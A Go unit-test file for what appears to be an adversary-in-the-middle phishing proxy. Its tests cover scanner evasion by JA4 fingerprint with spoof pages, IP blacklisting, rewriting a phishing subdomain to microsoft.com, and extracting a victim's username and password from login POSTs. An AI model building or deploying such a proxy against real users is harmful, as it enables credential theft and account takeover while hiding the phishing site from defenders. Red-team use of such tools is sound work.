package request_test

import (
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"testing"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
	"github.com/travisbale/mirage/internal/proxy/handlers/request"
)

func discardLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

func newReq(method, rawURL string, body io.Reader) *http.Request {
	req := httptest.NewRequest(method, rawURL, body)
	req.RequestURI = ""
	return req
}

// ---- JA4Extractor -----------------------------------------------------------

func TestJA4Extractor_NilHello_NoError(t *testing.T) {
	h := &request.JA4Extractor{}
	ctx := &aitm.ProxyContext{}
	req := newReq(http.MethodGet, "https://example.com/", nil)
	if err := h.Handle(ctx, req); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ctx.JA4Hash != "" {
		t.Errorf("expected empty JA4Hash, got %q", ctx.JA4Hash)
	}
}

// ---- BotGuardCheck ----------------------------------------------------------

type stubBotEval struct {
	verdict aitm.BotVerdict
}

func (s *stubBotEval) Evaluate(_ string, _ *aitm.BotTelemetry) aitm.BotVerdict {
	return s.verdict
}

type stubSpoofer struct{ called bool }

func (s *stubSpoofer) ServeHTTP(w http.ResponseWriter, _ *http.Request) {
	s.called = true
	w.WriteHeader(http.StatusOK)
}

func TestBotGuardCheck_Allow(t *testing.T) {
	spoofer := &stubSpoofer{}
	h := &request.BotGuardCheck{
		Service: &stubBotEval{verdict: aitm.VerdictAllow},
		Spoof:   spoofer,
	}
	ctx := &aitm.ProxyContext{JA4Hash: "t13d1516h2_abc_def"}
	rec := httptest.NewRecorder()
	ctx.ResponseWriter = rec
	req := newReq(http.MethodGet, "https://example.com/", nil)

	err := h.Handle(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if spoofer.called {
		t.Error("spoofer should not have been called on allow verdict")
	}
}

func TestBotGuardCheck_Spoof(t *testing.T) {
	spoofer := &stubSpoofer{}
	h := &request.BotGuardCheck{
		Service: &stubBotEval{verdict: aitm.VerdictSpoof},
		Spoof:   spoofer,
	}
	ctx := &aitm.ProxyContext{JA4Hash: "bad-ja4"}
	rec := httptest.NewRecorder()
	ctx.ResponseWriter = rec
	req := newReq(http.MethodGet, "https://example.com/", nil)

	err := h.Handle(ctx, req)
	if err != proxy.ErrShortCircuit {
		t.Fatalf("expected ErrShortCircuit, got %v", err)
	}
	if !spoofer.called {
		t.Error("expected spoofer to be called on spoof verdict")
	}
}

func TestBotGuardCheck_Block(t *testing.T) {
	spoofer := &stubSpoofer{}
	h := &request.BotGuardCheck{
		Service: &stubBotEval{verdict: aitm.VerdictBlock},
		Spoof:   spoofer,
	}
	ctx := &aitm.ProxyContext{JA4Hash: "scanner-ja4"}
	rec := httptest.NewRecorder()
	ctx.ResponseWriter = rec
	req := newReq(http.MethodGet, "https://example.com/", nil)

	err := h.Handle(ctx, req)
	if err != proxy.ErrShortCircuit {
		t.Fatalf("expected ErrShortCircuit, got %v", err)
	}
	if spoofer.called {
		t.Error("spoofer should NOT be called on block verdict (block = drop)")
	}
}

func TestBotGuardCheck_EmptyJA4_Skips(t *testing.T) {
	h := &request.BotGuardCheck{
		Service: &stubBotEval{verdict: aitm.VerdictSpoof},
		Spoof:   &stubSpoofer{},
	}
	ctx := &aitm.ProxyContext{} // no JA4Hash
	req := newReq(http.MethodGet, "https://example.com/", nil)
	if err := h.Handle(ctx, req); err != nil {
		t.Fatalf("expected nil error when JA4 is empty, got %v", err)
	}
}

// ---- BlacklistChecker -------------------------------------------------------

type stubIPBlocker struct{ block bool }

func (s *stubIPBlocker) IsBlocked(_ string) bool { return s.block }

func TestBlacklistChecker_NotBlocked(t *testing.T) {
	spoofer := &stubSpoofer{}
	h := &request.BlacklistChecker{
		Service: &stubIPBlocker{block: false},
		Spoof:   spoofer,
	}
	ctx := &aitm.ProxyContext{ClientIP: "1.2.3.4"}
	rec := httptest.NewRecorder()
	ctx.ResponseWriter = rec
	req := newReq(http.MethodGet, "https://example.com/", nil)

	if err := h.Handle(ctx, req); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if spoofer.called {
		t.Error("spoofer should not be called when IP is not blocked")
	}
}

func TestBlacklistChecker_Blocked(t *testing.T) {
	spoofer := &stubSpoofer{}
	h := &request.BlacklistChecker{
		Service: &stubIPBlocker{block: true},
		Spoof:   spoofer,
	}
	ctx := &aitm.ProxyContext{ClientIP: "1.2.3.4"}
	rec := httptest.NewRecorder()
	ctx.ResponseWriter = rec
	req := newReq(http.MethodGet, "https://example.com/", nil)

	err := h.Handle(ctx, req)
	if err != proxy.ErrShortCircuit {
		t.Fatalf("expected ErrShortCircuit, got %v", err)
	}
	if !spoofer.called {
		t.Error("expected spoofer to be called on blocked IP")
	}
}

// ---- URLRewriter ------------------------------------------------------------

func TestURLRewriter_RewritesHostname(t *testing.T) {
	h := &request.URLRewriter{}
	ctx := &aitm.ProxyContext{
		Phishlet: &aitm.PhishletDef{
			ProxyHosts: []aitm.ProxyHost{
				{PhishSubdomain: "login", OrigSubdomain: "login", Domain: "microsoft.com"},
			},
		},
		PhishletCfg: &aitm.PhishletConfig{BaseDomain: "phish.example.com"},
	}
	req := newReq(http.MethodGet, "https://login.phish.example.com/oauth2", nil)
	req.Host = "login.phish.example.com"

	if err := h.Handle(ctx, req); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(req.URL.Host, "microsoft.com") {
		t.Errorf("expected URL host to be rewritten to microsoft.com, got %q", req.URL.Host)
	}
}

// ---- CredentialExtractor ----------------------------------------------------

type stubCredentialStore struct{}

func (s *stubCredentialStore) UpdateSession(_ *aitm.Session) error { return nil }

func TestCredentialExtractor_ExtractsUsername(t *testing.T) {
	bus := newTestBus()
	h := &request.CredentialExtractor{
		Store: &stubCredentialStore{},
		Bus:   bus,
	}
	ctx := &aitm.ProxyContext{
		Session: &aitm.Session{ID: "sess-1"},
		Phishlet: &aitm.PhishletDef{
			// Empty Login spec → matches any POST to any path.
			Credentials: aitm.CredentialRules{
				Username: aitm.CredentialRule{
					Key:    regexp.MustCompile(`^username$`),
					Search: regexp.MustCompile(`^(.+)$`),
					Type:   "post",
				},
				Password: aitm.CredentialRule{
					Key:    regexp.MustCompile(`^password$`),
					Search: regexp.MustCompile(`^(.+)$`),
					Type:   "post",
				},
			},
		},
	}
	body := strings.NewReader("username=victim%40example.com&password=s3cr3t")
	req := newReq(http.MethodPost, "https://login.example.com/login", body)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	if err := h.Handle(ctx, req); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(ctx.Session.Username, "victim") {
		t.Errorf("expected username to be extracted, got %q", ctx.Session.Username)
	}
}

// ---- testBus ----------------------------------------------------------------

type testBus struct{}

func newTestBus() *testBus { return &testBus{} }

func (b *testBus) Publish(_ aitm.Event)                               {}
func (b *testBus) Subscribe(_ aitm.EventType) <-chan aitm.Event       { return make(chan aitm.Event, 1) }
func (b *testBus) Unsubscribe(_ aitm.EventType, _ <-chan aitm.Event) {}

var _ aitm.EventBus = (*testBus)(nil)
